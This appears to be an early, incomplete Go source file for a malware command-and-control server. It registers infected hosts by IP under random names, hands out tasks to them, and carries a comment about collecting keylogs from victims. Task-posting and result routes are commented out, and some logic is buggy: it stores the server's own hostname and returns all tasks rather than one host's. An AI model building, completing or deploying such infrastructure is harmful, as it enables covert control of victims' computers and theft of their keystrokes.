package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
)

type register struct {
	Name     string `json:"name"`   // random name
	IP       string `json:"ip"`     // public IP
	Hostname string `json:"host"`   // hostname
	Type     string `json:"type"`   // type
}

type task struct {
  Name    string  `json:"name"`
  ID      int     `json:"id"`     // 1 = func ...; 2 = func ...
  Arg1    string  `json:"arg1"`   // argv[1]
  Arg2    string  `json:"arg2"`   // argv[2]
}

type result struct {
  Name    string  `json:"name"`
  Status  int     `json:"status"` // 0 = gud; 1 = bad
  // TODO: find out how to receive the darn keylogs 
}

var users   []register
var tasks   []task
var results []result

func getUsers(c *gin.Context) {
	c.IndentedJSON(http.StatusOK, users)
}

func addUser(c *gin.Context) {
	var newUser register
	newUser.Name = generateRandomString(6)
	newUser.IP = c.ClientIP()
  for _, user := range users {
    if user.IP == newUser.IP {
      c.IndentedJSON(http.StatusConflict, gin.H{"message":"IP already exists"})
      return
    }
  }

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	newUser.Hostname = hostname

	newUser.Type = "POST"

	users = append(users, newUser)
	fmt.Println(newUser)
	c.IndentedJSON(http.StatusCreated, newUser)
}

func getUserByName(c *gin.Context) {
	name := c.Param("name")

	for _, a := range users {
		if a.Name == name {
			c.IndentedJSON(http.StatusOK, a)
			return
		}
	}
	c.IndentedJSON(http.StatusNotFound, gin.H{"message": "user not found"})
}

func generateRandomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func fetchTasks(c *gin.Context) {
  name := c.Param("name")

  for _, a := range tasks {
    if a.Name == name {
      c.IndentedJSON(http.StatusOK, tasks)
      return
    }
  }
  c.IndentedJSON(http.StatusNotFound, gin.H{"message": "could not find any tasks..."})
}

func main() {
	var IP string
	var Port string

	fmt.Println("---------[ Command & Control Server ]---------")
fmt.Print("Host IP: ")
	fmt.Scanln(&IP)
	fmt.Print("Host Port: ")
	fmt.Scanln(&Port)

	/*---------[ HTTP STUFF ]---------*/
	router := gin.Default()
	router.GET("/users", getUsers)
	router.POST("/users", addUser)
	router.GET("/users/:name", getUserByName)
  router.GET("/tasks/:name", fetchTasks)
  /*
    router.POST("/tasks/:name", postTask)
    router.GET("/results/:name", getResults)
    router.POST("/results/:name", postResults)
  */
	router.Run(IP + ":" + Port)
}
